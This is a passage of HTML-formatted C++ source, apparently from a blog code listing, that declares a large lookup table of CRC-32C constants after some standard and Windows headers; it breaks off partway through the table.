class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> t1[<span class="number">2048</span>] = &#123;</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0xF26B8303</span>, <span class="number">0xE13B70F7</span>, <span class="number">0x1350F3F4</span>, <span class="number">0xC79A971F</span>, <span class="number">0x35F1141C</span>, <span class="number">0x26A1E7E8</span>, <span class="number">0xD4CA64EB</span>,</span><br><span class="line"><span class="number">0x8AD958CF</span>, <span class="number">0x78B2DBCC</span>, <span class="number">0x6BE22838</span>, <span class="number">0x9989AB3B</span>, <span class="number">0x4D43CFD0</span>, <span class="number">0xBF284CD3</span>, <span class="number">0xAC78BF27</span>, <span class="number">0x5E133C24</span>,</span><br><span class="line"><span class="number">0x105EC76F</span>, <span class="number">0xE235446C</span>, <span class="number">0xF165B798</span>, <span class="number">0x030E349B</span>, <span class="number">0xD7C45070</span>, <span class="number">0x25AFD373</span>, <span class="number">0x36FF2087</span>, <span class="number">0xC494A384</span>,</span><br><span class="line"><span class="number">0x9A879FA0</span>, <span class="number">0x68EC1CA3</span>, <span class="number">0x7BBCEF57</span>, <span class="number">0x89D76C54</span>, <span class="number">0x5D1D08BF</span>, <span class="number">0xAF768BBC</span>, <span class="number">0xBC267848</span>, <span class="number">0x4E4DFB4B</span>,</span><br><span class="line"><span class="number">0x20BD8EDE</span>, <span class="number">0xD2D60DDD</span>, <span class="number">0xC186FE29</span>, <span class="number">0x33ED7D2A</span>, <span class="number">0xE72719C1</span>, <span class="number">0x154C9AC2</span>, <span class="number">0x061C6936</span>, <span class="number">0xF477EA35</span>,</span><br><span class="line"><span class="number">0xAA64D611</span>, <span class="number">0x580F5512</span>, <span class="number">0x4B5FA6E6</span>, <span class="number">0xB93425E5</span>, <span class="number">0x6DFE410E</span>, <span class="number">0x9F95C20D</span>, <span class="number">0x8CC531F9</span>, <span class="number">0x7EAEB2FA</span>,</span><br><span class="line"><span class="number">0x30E349B1</span>, <span class="number">0xC288CAB2</span>, <span class="number">0xD1D83946</span>, <span class="number">0x23B3BA45</span>, <span class="number">0xF779DEAE</span>, <span class="number">0x05125DAD</span>, <span class="number">0x1642AE59</span>, <span class="number">0xE4292D5A</span>,</span><br><span class="line"><span class="number">0xBA3A117E</span>, <span class="number">0x4851927D</span>, <span class="number">0x5B016189</span>, <span class="number">0xA96AE28A</span>, <span class="number">0x7DA08661</span>, <span class="number">0x8FCB0562</span>, <span class="number">0x9C9BF696</span>, <span class="number">0x6EF07595</span>,</span><br><span class="line"><span class="number">0x417B1DBC</span>, <span class="number">0xB3109EBF</span>, <span class="number">0xA0406D4B</span>, <span class="number">0x522BEE48</span>, <span class="number">0x86E18AA3</span>, <span class="number">0x748A09A0</span>, <span class="number">0x67DAFA54</span>, <span class="number">0x95B17957</span>,</span><br><span class="line"><span class="number">0xCBA24573</span>, <span class="number">0x39C9C670</span>, <span class="number">0x2A993584</span>, <span class="number">0xD8F2B687</span>, <span class="number">0x0C38D26C</span>, <span class="number">0xFE53516F</span>, <span class="number">0xED03A29B</span>, <span class="number">0x1F682198</span>,</span><br><span class="line"><span class="number">0x5125DAD3</span>, <span class="number">0xA34E59D0</span>, <span class="number">0xB01EAA24</span>, <span class="number">0x42752927</span>, <span class="number">0x96BF4DCC</span>, <span class="number">0x64D4CECF</span>, <span class="number">0x77843D3B</span>, <span class="number">0x85EFBE38</span>,</span><br><span class="line"><span class="number">0xDBFC821C</span>, <span class="number">0x2997011F</span>, <span class="number">0x3AC7F2EB</span>, <span class="number">0xC8AC71E8</span>, <span class="number">0x1C661503</span>, <span class="number">0xEE0D9600</span>, <span class="number">0xFD5D65F4</span>, <span class="number">0x0F36E6F7</span>,</span><br><span class="line"><span class="number">0x61C69362</span>, <span class="number">0x93AD1061</span>, <span class="number">0x80FDE395</span>, <span class="number">0x72966096</span>, <span class="number">0xA65C047D</span>, <span class="number">0x5437877E</span>, <span class="number">0x4767748A</span>, <span class="number">0xB50CF789</span>,</span><br><span class="line"><span class="number">0xEB1FCBAD</span>, <span class="number">0x197448AE</span>, <span class="number">0x0A24BB5A</span>, <span class="number">0xF84F3859</span>, <span class="number">0x2C855CB2</span>, <span class="number">0xDEEEDFB1</span>, <span class="number">0xCDBE2C45</span>, <span class="number">0x3FD5AF46</span>,</span><br><span class="line"><span class="number">0x7198540D</span>, <span class="number">0x83F3D70E</span>, <span class="number">0x90A324FA</span>, <span class="number">0x62C8A7F9</span>, <span class="number">0xB602C312</span>, <span class="number">0x44694011</span>, <span class="number">0x5739B3E5</span>, <span class="number">0xA55230E6</span>,</span><br><span class="line"><span class="number">0xFB410CC2</span>, <span class="number">0x092A8FC1</span>, <span class="number">0x1A7A7C35</span>, <span class="number">0xE811FF36</span>, <span class="number">0x3CDB9BDD</span>, <span class="number">0xCEB018DE</span>, <span class="number">0xDDE0EB2A</span>, <span class="number">0x2F8B6829</span>,</span><br><span class="line"><span class="number">0x82F63B78</span>, <span class="number">0x709DB87B</span>, <span class="number">0x63CD4B8F</span>, <span class="number">0x91A6C88C</span>, <span class="number">0x456CAC67</span>, <span class="number">0xB7072F64</span>, <span class="number">0xA457DC90</span>, <span class="number">0x563C5F93</span>,</span><br><span class="line"><span class="number">0x082F63B7</span>, <span class="number">0xFA44E0B4</span>, <span class="number">0xE9141340</span>, <span class="number">0x1B7F9043</span>, <span class="number">0xCFB5F4A8</span>, <span class="number">0x3DDE77AB</span>, <span class="number">0x2E8E845F</span>, <span class="number">0xDCE5075C</span>,</span><br><span class="line"><span class="number">0x92A8FC17</span>, <span class="number">0x60C37F14</span>, <span class="number">0x73938CE0</span>, <span class="number">0x81F80FE3</span>, <span class="number">0x55326B08</span>, <span class="number">0xA759E80B</span>, <span class="number">0xB4091BFF</span>, <span class="number">0x466298FC</span>,</span><br><span class="line"><span class="number">0x1871A4D8</span>, <span class="number">0xEA1A27DB</span>, <span class="number">0xF94AD42F</span>, <span class="number">0x0B21572C</span>, <span class="number">0xDFEB33C7</span>, <span class="number">0x2D80B0C4</span>, <span class="number">0x3ED04330</span>, <span class="number">0xCCBBC033</span>,</span><br><span class="line"><span class="number">0xA24BB5A6</span>, <span class="number">0x502036A5</span>, <span class="number">0x4370C551</span>, <span class="number">0xB11B4652</span>, <span class="number">0x65D122B9</span>, <span class="number">0x97BAA1BA</span>, <span class="number">0x84EA524E</span>, <span class="number">0x7681D14D</span>,</span><br><span class="line"><span class="number">0x2892ED69</span>, <span class="number">0xDAF96E6A</span>, <span class="number">0xC9A99D9E</span>, <span class="number">0x3BC21E9D</span>, <span class="number">0xEF087A76</span>, <span class="number">0x1D63F975</span>, <span class="number">0x0E330A81</span>, <span class="number">0xFC588982</span>,</span><br><span class="line"><span class="number">0xB21572C9</span>, <span class="number">0x407EF1CA</span>, <span class="number">0x532E023E</span>, <span class="number">0xA145813D</span>, <span class="number">0x758FE5D6</span>, <span class="number">0x87E466D5</span>, <span class="number">0x94B49521</span>, <span class="number">0x66DF1622</span>,</span><br><span class="line"><span class="number">0x38CC2A06</span>, <span class="number">0xCAA7A905</span>, <span class="number">0xD9F75AF1</span>, <span class="number">0x2B9CD9F2</span>, <span class="number">0xFF56BD19</span>, <span class="number">0x0D3D3E1A</span>, <span class="number">0x1E6DCDEE</span>, <span class="number">0xEC064EED</span>,</span><br><span class="line"><span class="number">0xC38D26C4</span>, <span class="number">0x31E6A5C7</span>, <span class="number">0x22B65633</span>, <span class="number">0xD0DDD530</span>, <span class="number">0x0417B1DB</span>, <span class="number">0xF67C32D8</span>, <span class="number">0xE52CC12C</span>, <span class="number">0x1747422F</span>,</span><br><span class="line"><span class="number">0x49547E0B</span>, <span class="number">0xBB3FFD08</span>, <span class="number">0xA86F0EFC</span>, <span class="number">0x5A048DFF</span>, <span class="number">0x8ECEE914</span>, <span class="number">0x7CA56A17</span>, <span class="number">0x6FF599E3</span>, <span class="number">0x9D9E1AE0</span>,</span><br><span class="line"><span class="number">0xD3D3E1AB</span>, <span class="number">0x21B862A8</span>, <span class="number">0x32E8915C</span>, <span class="number">0xC083125F</span>, <span class="number">0x144976B4</span>, <span class="number">0xE622F5B7</span>, <span class="number">0xF5720643</span>, <span class="number">0x07198540</span>,</span><br><span class="line"><span class="number">0x590AB964</span>, <span class="number">0xAB613A67</span>, <span class="number">0xB831C993</span>, <span class="number">0x4A5A4A90</span>, <span class="number">0x9E902E7B</span>, <span class="number">0x6CFBAD78</span>, <span class="number">0x7FAB5E8C</span>, <span class="number">0x8DC0DD8F</span>,</span><br><span class="line"><span class="number">0xE330A81A</span>, <span class="number">0x115B2B19</span>, <span class="number">0x020BD8ED</span>, <span class="number">0xF0605BEE</span>, <span class="number">0x24AA3F05</span>, <span class="number">0xD6C1BC06</span>, <span class="number">0xC5914FF2</span>, <span class="number">0x37FACCF1</span>,</span><br><span class="line"><span class="number">0x69E9F0D5</span>, <span class="number">0x9B8273D6</span>, <span class="number">0x88D28022</span>, <span class="number">0x7AB90321</span>, <span class="number">0xAE7367CA</span>, <span class="number">0x5C18E4C9</span>, <span class="number">0x4F48173D</span>, <span class="number">0xBD23943E</span>,</span><br><span class="line"><span class="number">0xF36E6F75</span>, <span class="number">0x0105EC76</span>, <span class="number">0x12551F82</span>, <span class="number">0xE03E9C81</span>, <span class="number">0x34F4F86A</span>, <span class="number">0xC69F7B69</span>, <span class="number">0xD5CF889D</span>, <span class="number">0x27A40B9E</span>,</span><br><span class="line"><span class="number">0x79B737BA</span>, <span class="number">0x8BDCB4B9</span>, <span class="number">0x988C474D</span>, <span class="number">0x6AE7C44E</span>, <span class="number">0xBE2DA0A5</span>, <span class="number">0x4C4623A6</span>, <span class="number">0x5F16D052</span>, <span class="number">0xAD7D5351</span>,</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0x13A29877</span>, <span class="number">0x274530EE</span>, <span class="number">0x34E7A899</span>, <span class="number">0x4E8A61DC</span>, <span class="number">0x5D28F9AB</span>, <span class="number">0x69CF5132</span>, <span class="number">0x7A6DC945</span>,</span><br><span class="line"><span class="number">0x9D14C3B8</span>, <span class="number">0x8EB65BCF</span>, <span class="number">0xBA51F356</span>, <span class="number">0xA9F36B21</span>, <span class="number">0xD39EA264</span>, <span class="number">0xC03C3A13</span>, <span class="number">0xF4DB928A</span>, <span class="number">0xE7790AFD</span>,</span><br><span class="line"><span class="number">0x3FC5F181</span>, <span class="number">0x2C6769F6</span>, <span class="number">0x1880C16F</span>, <span class="number">0x0B225918</span>, <span class="number">0x714F905D</span>, <span class="number">0x62ED082A</span>, <span class="number">0x560AA0B3</span>, <span class="number">0x45A838C4</span>,</span><br><span class="line"><span class="number">0xA2D13239</span>, <span class="number">0xB173AA4E</span>, <span class="number">0x859402D7</span>, <span class="number">0x96369AA0</span>, <span class="number">0xEC5B53E5</span>, <span class="number">0xFFF9CB92</span>, <span class="number">0xCB1E630B</span>, <span class="number">0xD8BCFB7C</span>,</span><br><span class="line"><span class="number">0x7F8BE302</span>, <span class="number">0x6C297B75</span>, <span class="number">0x58CED3EC</span>, <span class="number">0x4B6C4B9B</span>, <span class="number">0x310182DE</span>, <span class="number">0x22A31AA9</span>, <span class="number">0x1644B230</span>, <span class="number">0x05E62A47</span>,</span><br><span class="line"><span class="number">0xE29F20BA</span>, <span class="number">0xF13DB8CD</span>, <span class="number">0xC5DA1054</span>, <span class="number">0xD6788823</span>, <span class="number">0xAC154166</span>, <span class="number">0xBFB7D911</span>, <span class="number">0x8B507188</span>, <span class="number">0x98F2E9FF</span>,</span><br><span class="line"><span class="number">0x404E1283</span>, <span class="number">0x53EC8AF4</span>, <span class="number">0x670B226D</span>, <span class="number">0x74A9BA1A</span>, <span class="number">0x0EC4735F</span>, <span class="number">0x1D66EB28</span>, <span class="number">0x298143B1</span>, <span class="number">0x3A23DBC6</span>,</span><br><span class="line"><span class="number">0xDD5AD13B</span>, <span class="number">0xCEF8494C</span>, <span class="number">0xFA1FE1D5</span>, <span class="number">0xE9BD79A2</span>, <span class="number">0x93D0B0E7</span>, <span class="number">0x80722890</span>, <span class="number">0xB4958009</span>, <span class="number">0xA737187E</span>,</span><br><span class="line"><span class="number">0xFF17C604</span>, <span class="number">0xECB55E73</span>, <span class="number">0xD852F6EA</span>, <span class="number">0xCBF06E9D</span>, <span class="number">0xB19DA7D8</span>, <span class="number">0xA23F3FAF</span>, <span class="number">0x96D89736</span>, <span class="number">0x857A0F41</span>,</span><br><span class="line"><span class="number">0x620305BC</span>, <span class="number">0x71A19DCB</span>, <span class="number">0x45463552</span>, <span class="number">0x56E4AD25</span>, <span class="number">0x2C896460</span>, <span class="number">0x3F2BFC17</span>, <span class="number">0x0BCC548E</span>, <span class="number">0x186ECCF9</span>,</span><br><span class="line"><span class="number">0xC0D23785</span>, <span class="number">0xD370AFF2</span>, <span class="number">0xE797076B</span>, <span class="number">0xF4359F1C</span>, <span class="number">0x8E585659</span>, <span class="number">0x9DFACE2E</span>, <span class="number">0xA91D66B7</span>, <span class="number">0xBABFFEC0</span>,</span><br><span class="line"><span class="number">0x5DC6F43D</span>, <span class="number">0x4E646C4A</span>, <span class="number">0x7A83C4D3</span>, <span class="number">0x69215CA4</span>, <span class="number">0x134C95E1</span>, <span class="number">0x00EE0D96</span>, <span class="number">0x3409A50F</span>, <span class="number">0x27AB3D78</span>,</span><br><span class="line"><span class="number">0x809C2506</span>, <span class="number">0x933EBD71</span>, <span class="number">0xA7D915E8</span>, <span class="number">0xB47B8D9F</span>, <span class="number">0xCE1644DA</span>, <span class="number">0xDDB4DCAD</span>, <span class="number">0xE9537434</span>, <span class="number">0xFAF1EC43</span>,</span><br><span class="line"><span class="number">0x1D88E6BE</span>, <span class="number">0x0E2A7EC9</span>, <span class="number">0x3ACDD650</span>, <span class="number">0x296F4E27</span>, <span class="number">0x53028762</span>, <span class="number">0x40A01F15</span>, <span class="number">0x7447B78C</span>, <span class="number">0x67E52FFB</span>,</span><br><span class="line"><span class="number">0xBF59D487</span>, <span class="number">0xACFB4CF0</span>, <span class="number">0x981CE469</span>, <span class="number">0x8BBE7C1E</span>, <span class="number">0xF1D3B55B</span>, <span class="number">0xE2712D2C</span>, <span class="number">0xD69685B5</span>, <span class="number">0xC5341DC2</span>,</span><br><span class="line"><span class="number">0x224D173F</span>, <span class="number">0x31EF8F48</span>, <span class="number">0x050827D1</span>, <span class="number">0x16AABFA6</span>, <span class="number">0x6CC776E3</span>, <span class="number">0x7F65EE94</span>, <span class="number">0x4B82460D</span>, <span class="number">0x5820DE7A</span>,</span><br><span class="line"><span class="number">0xFBC3FAF9</span>, <span class="number">0xE861628E</span>, <span class="number">0xDC86CA17</span>, <span class="number">0xCF245260</span>, <span class="number">0xB5499B25</span>, <span class="number">0xA6EB0352</span>, <span class="number">0x920CABCB</span>, <span class="number">0x81AE33BC</span>,</span><br><span class="line"><span class="number">0x66D73941</span>, <span class="number">0x7575A136</span>, <span class="number">0x419209AF</span>, <span class="number">0x523091D8</span>, <span class="number">0x285D589D</span>, <span class="number">0x3BFFC0EA</span>, <span class="number">0x0F186873</span>, <span class="number">0x1CBAF004</span>,</span><br><span class="line"><span class="number">0xC4060B78</span>, <span class="number">0xD7A4930F</span>, <span class="number">0xE3433B96</span>, <span class="number">0xF0E1A3E1</span>, <span class="number">0x8A8C6AA4</span>, <span class="number">0x992EF2D3</span>, <span class="number">0xADC95A4A</span>, <span class="number">0xBE6BC23D</span>,</span><br><span class="line"><span class="number">0x5912C8C0</span>, <span class="number">0x4AB050B7</span>, <span class="number">0x7E57F82E</span>, <span class="number">0x6DF56059</span>, <span class="number">0x1798A91C</span>, <span class="number">0x043A316B</span>, <span class="number">0x30DD99F2</span>, <span class="number">0x237F0185</span>,</span><br><span class="line"><span class="number">0x844819FB</span>, <span class="number">0x97EA818C</span>, <span class="number">0xA30D2915</span>, <span class="number">0xB0AFB162</span>, <span class="number">0xCAC27827</span>, <span class="number">0xD960E050</span>, <span class="number">0xED8748C9</span>, <span class="number">0xFE25D0BE</span>,</span><br><span class="line"><span class="number">0x195CDA43</span>, <span class="number">0x0AFE4234</span>, <span class="number">0x3E19EAAD</span>, <span class="number">0x2DBB72DA</span>, <span class="number">0x57D6BB9F</span>, <span class="number">0x447423E8</span>, <span class="number">0x70938B71</span>, <span class="number">0x63311306</span>,</span><br><span class="line"><span class="number">0xBB8DE87A</span>, <span class="number">0xA82F700D</span>, <span class="number">0x9CC8D894</span>, <span class="number">0x8F6A40E3</span>, <span class="number">0xF50789A6</span>, <span class="number">0xE6A511D1</span>, <span class="number">0xD242B948</span>, <span class="number">0xC1E0213F</span>,</span><br><span class="line"><span class="number">0x26992BC2</span>, <span class="number">0x353BB3B5</span>, <span class="number">0x01DC1B2C</span>, <span class="number">0x127E835B</span>, <span class="number">0x68134A1E</span>, <span class="number">0x7BB1D269</span>, <span class="number">0x4F567AF0</span>, <span class="number">0x5CF4E287</span>,</span><br><span class="line"><span class="number">0x04D43CFD</span>, <span class="number">0x1776A48A</span>, <span class="number">0x23910C13</span>, <span class="number">0x30339464</span>, <span class="number">0x4A5E5D21</span>, <span class="number">0x59FCC556</span>, <span class="number">0x6D1B6DCF</span>, <span class="number">0x7EB9F5B8</span>,</span><br><span class="line"><span class="number">0x99C0FF45</span>, <span class="number">0x8A626732</span>, <span class="number">0xBE85CFAB</span>, <span class="number">0xAD2757DC</span>, <span class="number">0xD74A9E99</span>, <span class="number">0xC4E806EE</span>, <span class="number">0xF00FAE77</span>, <span class="number">0xE3AD3600</span>,</span><br><span class="line"><span class="number">0x3B11CD7C</span>, <span class="number">0x28B3550B</span>, <span class="number">0x1C54FD92</span>, <span class="number">0x0FF665E5</span>, <span class="number">0x759BACA0</span>, <span class="number">0x663934D7</span>, <span class="number">0x52DE9C4E</span>, <span class="number">0x417C0439</span>,</span><br><span class="line"><span class="number">0xA6050EC4</span>, <span class="number">0xB5A796B3</span>, <span class="number">0x81403E2A</span>, <span class="number">0x92E2A65D</span>, <span class="number">0xE88F6F18</span>, <span class="number">0xFB2DF76F</span>, <span class="number">0xCFCA5FF6</span>, <span class="number">0xDC68C781</span>,</span><br><span class="line"><span class="number">0x7B5FDFFF</span>, <span class="number">0x68FD4788</span>, <span class="number">0x5C1AEF11</span>, <span class="number">0x4FB87766</span>, <span class="number">0x35D5BE23</span>, <span class="number">0x26772654</span>, <span class="number">0x12908ECD</span>, <span class="number">0x013216BA</span>,</span><br><span class="line"><span class="number">0xE64B1C47</span>, <span class="number">0xF5E98430</span>, <span class="number">0xC10E2CA9</span>, <span class="number">0xD2ACB4DE</span>, <span class="number">0xA8C17D9B</span>, <span class="number">0xBB63E5EC</span>, <span class="number">0x8F844D75</span>, <span class="number">0x9C26D502</span>,</span><br><span class="line"><span class="number">0x449A2E7E</span>, <span class="number">0x5738B609</span>, <span class="number">0x63DF1E90</span>, <span class="number">0x707D86E7</span>, <span class="number">0x0A104FA2</span>, <span class="number">0x19B2D7D5</span>, <span class="number">0x2D557F4C</span>, <span class="number">0x3EF7E73B</span>,</span><br><span class="line"><span class="number">0xD98EEDC6</span>, <span class="number">0xCA2C75B1</span>, <span class="number">0xFECBDD28</span>, <span class="number">0xED69455F</span>, <span class="number">0x97048C1A</span>, <span class="number">0x84A6146D</span>, <span class="number">0xB041BCF4</span>, <span class="number">0xA3E32483</span>,</span><br><span class="line"><span class="number">0x00000000</span>, <span class="number">0xA541927E</span>, <span class="number">0x4F6F520D</span>, <span class="number">0xEA2EC073</span>, <span class="number">0x9EDEA41A</span>, <span class="number">0x3B9F3664</span>, <span class="number">0xD1B1F617</span>, <span class="number">0x74F06469</span>,</span><br><span class="line"><span class="number">0x38513EC5</span>, <span class="number">0x9D10ACBB</span>, <span class="number">0x773E6CC8</span>, <span class="number">0xD27FFEB6</span>, <span class="number">0xA68F9ADF</span>, <span class="number">0x03CE08A1</span>, <span class="number">0xE9E0C8D2</span>, <span class="number">0x4CA15AAC</span>,</span><br><span class="line"><span class="number">0x70A27D8A</span>, <span class="number">0xD5E3EFF4</span>, <span class="number">0x3FCD2F87</span>, <span class="number">0x9A8CBDF9</span>, <span class="number">0xEE7CD990</span>, <span class="number">0x4B3D4BEE</span>, <span class="number">0xA1138B9D</span>, <span class="number">0x045219E3</span>,</span><br><span class="line"><span class="number">0x48F3434F</span>, <span class="number">0xEDB2D131</span>, <span class="number">0x079C1142</span>, <span class="number">0xA2DD833C</span>, <span class="number">0xD62DE755</span>, <span class="number">0x736C752B</span>, <span class="number">0x9942B558</span>, <span class="number">0x3C032726</span>,</span><br><span class="line"><span class="number">0xE144FB14</span>, <span class="number">0x4405696A</span>, <span class="number">0xAE2BA919</span>, <span class="number">0x0B6A3B67</span>, <span class="number">0x7F9A5F0E</span>, <span class="number">0xDADBCD70</span>, <span class="number">0x30F50D03</span>, <span class="number">0x95B49F7D</span>,</span><br><span class="line"><span class="number">0xD915C5D1</span>, <span class="number">0x7C5457AF</span>, <span class="number">0x967A97DC</span>, <span class="number">0x333B05A2</span>, <span class="number">0x47CB61CB</span>, <span class="number">0xE28AF3B5</span>, <span class="number">0x08A433C6</span>, <span class="number">0xADE5A1B8</span>,</span><br><span class="line"><span class="number">0x91E6869E</span>, <span class="number">0x34A714E0</span>, <span class="number">0xDE89D493</span>, <span class="number">0x7BC846ED</span>, <span class="number">0x0F382284</span>, <span class="number">0xAA79B0FA</span>, <span class="number">0x40577089</span>, <span class="number">0xE516E2F7</span>,</span><br><span class="line"><span class="number">0xA9B7B85B</span>, <span class="number">0x0CF62A25</span>, <span class="number">0xE6D8EA56</span>, <span class="number">0x43997828</span>, <span class="number">0x37691C41</span>, <span class="number">0x92288E3F</span>, <span class="number">0x78064E4C</span>, <span class="number">0xDD47DC32</span>,</span><br><span class="line"><span class="number">0xC76580D9</span>, <span class="number">0x622412A7</span>, <span class="number">0x880AD2D4</span>, <span class="number">0x2D4B40AA</span>, <span class="number">0x59BB24C3</span>, <span class="number">0xFCFAB6BD</span>, <span class="number">0x16D476CE</span>, <span class="number">0xB395E4B0</span>,</span><br><span class="line"><span class="number">0xFF34BE1C</span>, <span class="number">0x5A752C62</span>, <span class="number">0xB05BEC11</span>, <span class="number">0x151A7E6F</span>, <span class="number">0x61EA1A06</span>, <span class="number">0xC4AB8878</span>, <span class="number">0x2E85480B</span>, <span class="number">0x8BC4DA75</span>,</span><br><span class="line"><span class="number">0xB7C7FD53</span>, <span class="number">0x12866F2D</span>, <span class="number">0xF8A8AF5E</span>, <span class="number">0x5DE93D20</span>, <span class="number">0x29195949</span>, <span class="number">0x8C58CB37</span>, <span class="number">0x66760B44</span>, <span class="number">0xC337993A</span>,</span><br><span class="line"><span class="number">0x8F96C396</span>, <span class="number">0x2AD751E8</span>, <span class="number">0xC0F9919B</span>, <span class="number">0x65B803E5</span>, <span class="number">0x1148678C</span>, <span class="number">0xB409F5F2</span>, <span class="number">0x5E273581</span>, <span class="number">0xFB66A7FF</span>,</span><br><span class="line"><span class="number">0x26217BCD</span>, <span class="number">0x8360E9B3</span>, <span class="number">0x694E29C0</span>, <span class="number">0xCC0FBBBE</span>, <span class="number">0xB8FFDFD7</span>, <span class="number">0x1DBE4DA9</span>, <span class="number">0xF7908DDA</span>, <span class="number">0x52D11FA4</span>,</span><br><span class="line"><span class="number">0x1E704508</span>, <span class="number">0xBB31D776</span>, <span class="number">0x511F1705</span>, <span class="number">0xF45E857B</span>, <span class="number">0x80AEE112</span>, <span class="number">0x25EF736C</span>, <span class="number">0xCFC1B31F</span>, <span class="number">0x6A802161</span>,</span><br><span class="line"><span class="number">0x56830647</span>, <span class="number">0xF3C29439</span>, <span class="number">0x19EC544A</span>, <span class="number">0xBCADC634</span>, <span class="number">0xC85DA25D</span>, <span class="number">0x6D1C3023</span>, <span class="number">0x8732F050</span>, <span class="number">0x2273622E</span>,</span><br><span class="line"><span class="number">0x6ED23882</span>, <span class="number">0xCB93AAFC</span>, <span class="number">0x21BD6A8F</span>, <span class="number">0x84FCF8F1</span>, <span class="number">0xF00C9C98</span>, <span class="number">0x554D0EE6</span>, <span class="number">0xBF63CE95</span>, <span class="number">0x1A225CEB</span>,</span><br><span class="line"><span class="number">0x8B277743</span>, <span class="number">0x2E66E53D</span>, <span class="number">0xC448254E</span>, <span class="number">0x6109B730</span>, <span class="number">0x15F9D359</span>, <span class="number">0xB0B84127</span>, <span class="number">0x5A968154</span>, <span class="number">0xFFD7132A</span>,</span><br><span class="line"><span class="number">0xB3764986</span>, <span class="number">0x1637DBF8</span>, <span class="number">0xFC191B8B</span>, <span class="number">0x595889F5</span>, <span class="number">0x2DA8ED9C</span>, <span class="number">0x88E97FE2</span>, <span class="number">0x62C7BF91</span>, <span class="number">0xC7862DEF</span>,</span><br><span class="line"><span class="number">0xFB850AC9</span>, <span class="number">0x5EC498B7</span>, <span class="number">0xB4EA58C4</span>, <span class="number">0x11ABCABA</span>, <span class="number">0x655BAED3</span>, <span class="number">0xC01A3CAD</span>, <span class="number">0x2A34FCDE</span>, <span class="number">0x8F756EA0</span>,</span><br><span class="line"><span class="number">0xC3D4340C</span>, <span class="number">0x6695A672</span>, <span class="number">0x8CBB6601</span>, <span class="number">0x29FAF47F</span>, <span class="number">0x5D0A9016</span>, <span class="number">0xF84B0268</span>, <span class="number">0x1265C21B</span>, <span class="number">0xB7245065</span>,</span><br><span class="line"><span class="number">0x6A638C57</span>, <span class="number">0xCF221E29</span>, <span class="number">0x250CDE5A</span>, <span class="number">0x804D4C24</span>, <span class="number">0xF4BD284D</span>, <span class="number">0x51FCBA33</span>, <span class="number">0xBBD27A40</span>, <span class="number">0x1E93E83E</span>,</span><br><span class="line"><span class="number">0x5232B292</span>, <span class="number">0xF77320EC</span>, <span class="number">0x1D5DE09F</span>, <span class="number">0xB81C72E1</span>, <span class="number">0xCCEC1688</span>, <span class="number">0x69AD84F6</span>, <span class="number">0x83834485</span>, <span class="number">0x26C2D6FB</span>,</span><br><span class="line"><span class="number">0x1AC1F1DD</span>, <span class="number">0xBF8063A3</span>, <span class="number">0x55AEA3D0</span>, <span class="number">0xF0EF31AE</span>, <span class="number">0x841F55C7</span>, <span class="number">0x215EC7B9</span>, <span class="number">0xCB7007CA</span>, <span class="number">0x6E3195B4</span>,</span><br><span class="line"><span class="number">0x2290CF18</span>, <span class="number">0x87D15D66</span>, <span class="number">0x6DFF9D15</span>, <span class="number">0xC8BE0F6B</span>, <span class="number">0xBC4E6B02</span>, <span class="number">0x190FF97C</span>, <span class="number">0xF321390F</span>, <span class="number">0x5660AB71</span>,</span><br><span class="line"><span class="number">0x4C42F79A</span>, <span class="number">0xE90365E4</span>, <span class="number">0x032DA597</span>, <span class="number">0xA66C37E9</span>, <span class="number">0xD29C5380</span>, <span class="number">0x77DDC1FE</span>, <span class="number">0x9DF3018D</span>, <span class="number">0x38B293F3</span>,</span><br><span class="line"><span class="number">0x7413C95F</span>, <span 